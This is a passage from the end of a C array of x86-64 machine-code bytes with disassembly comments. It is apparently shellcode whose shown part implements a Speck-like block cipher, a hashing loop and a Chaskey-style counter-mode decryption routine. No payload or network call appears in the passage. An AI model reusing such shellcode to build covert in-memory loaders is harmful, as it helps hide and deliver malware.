  /* 09DF */ "\x48\x8d\x4c\x24\x20"                     /* lea       rcx, qword ptr [rsp + 0x20]          */
  /* 09E4 */ "\xe8\x5f\x00\x00\x00"                     /* call      0xa48                                */
  /* 09E9 */ "\x48\x33\xd8"                             /* xor       rbx, rax                             */
  /* 09EC */ "\x48\x8d\x7c\x24\x20"                     /* lea       rdi, qword ptr [rsp + 0x20]          */
  /* 09F1 */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 09F3 */ "\x8d\x48\x10"                             /* lea       ecx, dword ptr [rax + 0x10]          */
  /* 09F6 */ "\xf3\xaa"                                 /* rep stosb byte ptr [rdi], al                   */
  /* 09F8 */ "\x8b\xc6"                                 /* mov       eax, esi                             */
  /* 09FA */ "\x41\xb8\x10\x00\x00\x00"                 /* mov       r8d, 0x10                            */
  /* 0A00 */ "\xc1\xe0\x03"                             /* shl       eax, 3                               */
  /* 0A03 */ "\x89\x44\x24\x2c"                         /* mov       dword ptr [rsp + 0x2c], eax          */
  /* 0A07 */ "\xff\xc5"                                 /* inc       ebp                                  */
  /* 0A09 */ "\x41\x83\xf8\x10"                         /* cmp       r8d, 0x10                            */
  /* 0A0D */ "\x75\x13"                                 /* jne       0xa22                                */
  /* 0A0F */ "\x48\x8b\xd3"                             /* mov       rdx, rbx                             */
  /* 0A12 */ "\x48\x8d\x4c\x24\x20"                     /* lea       rcx, qword ptr [rsp + 0x20]          */
  /* 0A17 */ "\xe8\x2c\x00\x00\x00"                     /* call      0xa48                                */
  /* 0A1C */ "\x48\x33\xd8"                             /* xor       rbx, rax                             */
  /* 0A1F */ "\x45\x33\xc0"                             /* xor       r8d, r8d                             */
  /* 0A22 */ "\x85\xed"                                 /* test      ebp, ebp                             */
  /* 0A24 */ "\x0f\x84\x74\xff\xff\xff"                 /* je        0x99e                                */
  /* 0A2A */ "\x48\x8b\x6c\x24\x48"                     /* mov       rbp, qword ptr [rsp + 0x48]          */
  /* 0A2F */ "\x48\x8b\xc3"                             /* mov       rax, rbx                             */
  /* 0A32 */ "\x48\x8b\x5c\x24\x40"                     /* mov       rbx, qword ptr [rsp + 0x40]          */
  /* 0A37 */ "\x48\x8b\x74\x24\x50"                     /* mov       rsi, qword ptr [rsp + 0x50]          */
  /* 0A3C */ "\x48\x8b\x7c\x24\x58"                     /* mov       rdi, qword ptr [rsp + 0x58]          */
  /* 0A41 */ "\x48\x83\xc4\x30"                         /* add       rsp, 0x30                            */
  /* 0A45 */ "\x41\x5e"                                 /* pop       r14                                  */
  /* 0A47 */ "\xc3"                                     /* ret                                            */
  /* 0A48 */ "\x48\x8b\xc4"                             /* mov       rax, rsp                             */
  /* 0A4B */ "\x53"                                     /* push      rbx                                  */
  /* 0A4C */ "\x48\x83\xec\x10"                         /* sub       rsp, 0x10                            */
  /* 0A50 */ "\x0f\x10\x01"                             /* movups    xmm0, xmmword ptr [rcx]              */
  /* 0A53 */ "\x48\x89\x50\x10"                         /* mov       qword ptr [rax + 0x10], rdx          */
  /* 0A57 */ "\x8b\xca"                                 /* mov       ecx, edx                             */
  /* 0A59 */ "\x44\x8b\x40\x14"                         /* mov       r8d, dword ptr [rax + 0x14]          */
  /* 0A5D */ "\x45\x33\xd2"                             /* xor       r10d, r10d                           */
  /* 0A60 */ "\x0f\x11\x04\x24"                         /* movups    xmmword ptr [rsp], xmm0              */
  /* 0A64 */ "\x8b\x50\xf4"                             /* mov       edx, dword ptr [rax - 0xc]           */
  /* 0A67 */ "\x44\x8b\x58\xf0"                         /* mov       r11d, dword ptr [rax - 0x10]         */
  /* 0A6B */ "\x8b\x58\xec"                             /* mov       ebx, dword ptr [rax - 0x14]          */
  /* 0A6E */ "\x44\x8b\x0c\x24"                         /* mov       r9d, dword ptr [rsp]                 */
  /* 0A72 */ "\x8b\xc2"                                 /* mov       eax, edx                             */
  /* 0A74 */ "\xc1\xc9\x08"                             /* ror       ecx, 8                               */
  /* 0A77 */ "\x41\x03\xc8"                             /* add       ecx, r8d                             */
  /* 0A7A */ "\x8b\xd3"                                 /* mov       edx, ebx                             */
  /* 0A7C */ "\x41\x33\xc9"                             /* xor       ecx, r9d                             */
  /* 0A7F */ "\xc1\xca\x08"                             /* ror       edx, 8                               */
  /* 0A82 */ "\x41\x03\xd1"                             /* add       edx, r9d                             */
  /* 0A85 */ "\x41\xc1\xc0\x03"                         /* rol       r8d, 3                               */
  /* 0A89 */ "\x41\x33\xd2"                             /* xor       edx, r10d                            */
  /* 0A8C */ "\x41\xc1\xc1\x03"                         /* rol       r9d, 3                               */
  /* 0A90 */ "\x44\x33\xca"                             /* xor       r9d, edx                             */
  /* 0A93 */ "\x44\x33\xc1"                             /* xor       r8d, ecx                             */
  /* 0A96 */ "\x41\xff\xc2"                             /* inc       r10d                                 */
  /* 0A99 */ "\x41\x8b\xdb"                             /* mov       ebx, r11d                            */
  /* 0A9C */ "\x44\x8b\xd8"                             /* mov       r11d, eax                            */
  /* 0A9F */ "\x41\x83\xfa\x1b"                         /* cmp       r10d, 0x1b                           */
  /* 0AA3 */ "\x72\xcd"                                 /* jb        0xa72                                */
  /* 0AA5 */ "\x89\x4c\x24\x28"                         /* mov       dword ptr [rsp + 0x28], ecx          */
  /* 0AA9 */ "\x44\x89\x44\x24\x2c"                     /* mov       dword ptr [rsp + 0x2c], r8d          */
  /* 0AAE */ "\x48\x8b\x44\x24\x28"                     /* mov       rax, qword ptr [rsp + 0x28]          */
  /* 0AB3 */ "\x48\x83\xc4\x10"                         /* add       rsp, 0x10                            */
  /* 0AB7 */ "\x5b"                                     /* pop       rbx                                  */
  /* 0AB8 */ "\xc3"                                     /* ret                                            */
  /* 0AB9 */ "\xcc"                                     /* int3                                           */
  /* 0ABA */ "\xcc"                                     /* int3                                           */
  /* 0ABB */ "\xcc"                                     /* int3                                           */
  /* 0ABC */ "\x4d\x85\xc9"                             /* test      r9, r9                               */
  /* 0ABF */ "\x0f\x84\x20\x01\x00\x00"                 /* je        0xbe5                                */
  /* 0AC5 */ "\x48\x89\x5c\x24\x08"                     /* mov       qword ptr [rsp + 8], rbx             */
  /* 0ACA */ "\x48\x89\x74\x24\x10"                     /* mov       qword ptr [rsp + 0x10], rsi          */
  /* 0ACF */ "\x48\x89\x7c\x24\x18"                     /* mov       qword ptr [rsp + 0x18], rdi          */
  /* 0AD4 */ "\x55"                                     /* push      rbp                                  */
  /* 0AD5 */ "\x41\x55"                                 /* push      r13                                  */
  /* 0AD7 */ "\x41\x56"                                 /* push      r14                                  */
  /* 0AD9 */ "\x48\x8b\xec"                             /* mov       rbp, rsp                             */
  /* 0ADC */ "\x48\x83\xec\x10"                         /* sub       rsp, 0x10                            */
  /* 0AE0 */ "\x4c\x8b\xd1"                             /* mov       r10, rcx                             */
  /* 0AE3 */ "\x48\x8d\x45\xf0"                         /* lea       rax, qword ptr [rbp - 0x10]          */
  /* 0AE7 */ "\x4c\x2b\xd0"                             /* sub       r10, rax                             */
  /* 0AEA */ "\xbf\x01\x00\x00\x00"                     /* mov       edi, 1                               */
  /* 0AEF */ "\x48\x2b\xfa"                             /* sub       rdi, rdx                             */
  /* 0AF2 */ "\x48\x8b\xda"                             /* mov       rbx, rdx                             */
  /* 0AF5 */ "\x41\xbd\x10\x00\x00\x00"                 /* mov       r13d, 0x10                           */
  /* 0AFB */ "\x0f\x10\x03"                             /* movups    xmm0, xmmword ptr [rbx]              */
  /* 0AFE */ "\x48\x8d\x4d\xf0"                         /* lea       rcx, qword ptr [rbp - 0x10]          */
  /* 0B02 */ "\xba\x04\x00\x00\x00"                     /* mov       edx, 4                               */
  /* 0B07 */ "\x0f\x11\x45\xf0"                         /* movups    xmmword ptr [rbp - 0x10], xmm0       */
  /* 0B0B */ "\x41\x8b\x04\x0a"                         /* mov       eax, dword ptr [r10 + rcx]           */
  /* 0B0F */ "\x31\x01"                                 /* xor       dword ptr [rcx], eax                 */
  /* 0B11 */ "\x48\x8d\x49\x04"                         /* lea       rcx, qword ptr [rcx + 4]             */
  /* 0B15 */ "\x48\x83\xea\x01"                         /* sub       rdx, 1                               */
  /* 0B19 */ "\x75\xf0"                                 /* jne       0xb0b                                */
  /* 0B1B */ "\x8b\x4d\xfc"                             /* mov       ecx, dword ptr [rbp - 4]             */
  /* 0B1E */ "\x49\x8b\xf5"                             /* mov       rsi, r13                             */
  /* 0B21 */ "\x8b\x45\xf8"                             /* mov       eax, dword ptr [rbp - 8]             */
  /* 0B24 */ "\x8b\x55\xf4"                             /* mov       edx, dword ptr [rbp - 0xc]           */
  /* 0B27 */ "\x44\x8b\x5d\xf0"                         /* mov       r11d, dword ptr [rbp - 0x10]         */
  /* 0B2B */ "\x44\x03\xda"                             /* add       r11d, edx                            */
  /* 0B2E */ "\x03\xc1"                                 /* add       eax, ecx                             */
  /* 0B30 */ "\xc1\xc2\x05"                             /* rol       edx, 5                               */
  /* 0B33 */ "\x41\x33\xd3"                             /* xor       edx, r11d                            */
  /* 0B36 */ "\xc1\xc1\x08"                             /* rol       ecx, 8                               */
  /* 0B39 */ "\x33\xc8"                                 /* xor       ecx, eax                             */
  /* 0B3B */ "\x41\xc1\xc3\x10"                         /* rol       r11d, 0x10                           */
  /* 0B3F */ "\x03\xc2"                                 /* add       eax, edx                             */
  /* 0B41 */ "\x44\x03\xd9"                             /* add       r11d, ecx                            */
  /* 0B44 */ "\xc1\xc2\x07"                             /* rol       edx, 7                               */
  /* 0B47 */ "\xc1\xc1\x0d"                             /* rol       ecx, 0xd                             */
  /* 0B4A */ "\x33\xd0"                                 /* xor       edx, eax                             */
  /* 0B4C */ "\x41\x33\xcb"                             /* xor       ecx, r11d                            */
  /* 0B4F */ "\xc1\xc0\x10"                             /* rol       eax, 0x10                            */
  /* 0B52 */ "\x48\x83\xee\x01"                         /* sub       rsi, 1                               */
  /* 0B56 */ "\x75\xd3"                                 /* jne       0xb2b                                */
  /* 0B58 */ "\x89\x4d\xfc"                             /* mov       dword ptr [rbp - 4], ecx             */
  /* 0B5B */ "\x48\x8d\x4d\xf0"                         /* lea       rcx, qword ptr [rbp - 0x10]          */
  /* 0B5F */ "\x89\x55\xf4"                             /* mov       dword ptr [rbp - 0xc], edx           */
  /* 0B62 */ "\x8d\x56\x04"                             /* lea       edx, dword ptr [rsi + 4]             */
  /* 0B65 */ "\x44\x89\x5d\xf0"                         /* mov       dword ptr [rbp - 0x10], r11d         */
  /* 0B69 */ "\x89\x45\xf8"                             /* mov       dword ptr [rbp - 8], eax             */
  /* 0B6C */ "\x42\x8b\x04\x11"                         /* mov       eax, dword ptr [rcx + r10]           */
  /* 0B70 */ "\x31\x01"                                 /* xor       dword ptr [rcx], eax                 */
  /* 0B72 */ "\x48\x8d\x49\x04"                         /* lea       rcx, qword ptr [rcx + 4]             */
  /* 0B76 */ "\x48\x83\xea\x01"                         /* sub       rdx, 1                               */
  /* 0B7A */ "\x75\xf0"                                 /* jne       0xb6c                                */
  /* 0B7C */ "\x4d\x3b\xcd"                             /* cmp       r9, r13                              */
  /* 0B7F */ "\x41\x8b\xc1"                             /* mov       eax, r9d                             */
  /* 0B82 */ "\x41\x0f\x47\xc5"                         /* cmova     eax, r13d                            */
  /* 0B86 */ "\x48\x63\xd0"                             /* movsxd    rdx, eax                             */
  /* 0B89 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0B8B */ "\x7e\x1c"                                 /* jle       0xba9                                */
  /* 0B8D */ "\x4c\x8d\x5d\xf0"                         /* lea       r11, qword ptr [rbp - 0x10]          */
  /* 0B91 */ "\x49\x8b\xc8"                             /* mov       rcx, r8                              */
  /* 0B94 */ "\x4d\x2b\xd8"                             /* sub       r11, r8                              */
  /* 0B97 */ "\x48\x8b\xf2"                             /* mov       rsi, rdx                             */
  /* 0B9A */ "\x41\x8a\x04\x0b"                         /* mov       al, byte ptr [r11 + rcx]             */
  /* 0B9E */ "\x30\x01"                                 /* xor       byte ptr [rcx], al                   */
  /* 0BA0 */ "\x48\xff\xc1"                             /* inc       rcx                                  */
  /* 0BA3 */ "\x48\x83\xee\x01"                         /* sub       rsi, 1                               */
  /* 0BA7 */ "\x75\xf1"                                 /* jne       0xb9a                                */
  /* 0BA9 */ "\x4c\x2b\xca"                             /* sub       r9, rdx                              */
  /* 0BAC */ "\x48\x8d\x4b\x0f"                         /* lea       rcx, qword ptr [rbx + 0xf]           */
  /* 0BB0 */ "\x4c\x03\xc2"                             /* add       r8, rdx                              */
  /* 0BB3 */ "\x80\x01\x01"                             /* add       byte ptr [rcx], 1                    */
  /* 0BB6 */ "\x75\x0c"                                 /* jne       0xbc4                                */
  /* 0BB8 */ "\x48\xff\xc9"                             /* dec       rcx                                  */
  /* 0BBB */ "\x48\x8d\x04\x0f"                         /* lea       rax, qword ptr [rdi + rcx]           */
  /* 0BBF */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 0BC2 */ "\x7f\xef"                                 /* jg        0xbb3                                */
  /* 0BC4 */ "\x4d\x85\xc9"                             /* test      r9, r9                               */
  /* 0BC7 */ "\x0f\x85\x2e\xff\xff\xff"                 /* jne       0xafb                                */
  /* 0BCD */ "\x48\x8b\x5c\x24\x30"                     /* mov       rbx, qword ptr [rsp + 0x30]          */
  /* 0BD2 */ "\x48\x8b\x74\x24\x38"                     /* mov       rsi, qword ptr [rsp + 0x38]          */
  /* 0BD7 */ "\x48\x8b\x7c\x24\x40"                     /* mov       rdi, qword ptr [rsp + 0x40]          */
  /* 0BDC */ "\x48\x83\xc4\x10"                         /* add       rsp, 0x10                            */
  /* 0BE0 */ "\x41\x5e"                                 /* pop       r14                                  */
  /* 0BE2 */ "\x41\x5d"                                 /* pop       r13                                  */
  /* 0BE4 */ "\x5d"                                     /* pop       rbp                                  */
  /* 0BE5 */ "\xc3"                                     /* ret                                            */
};
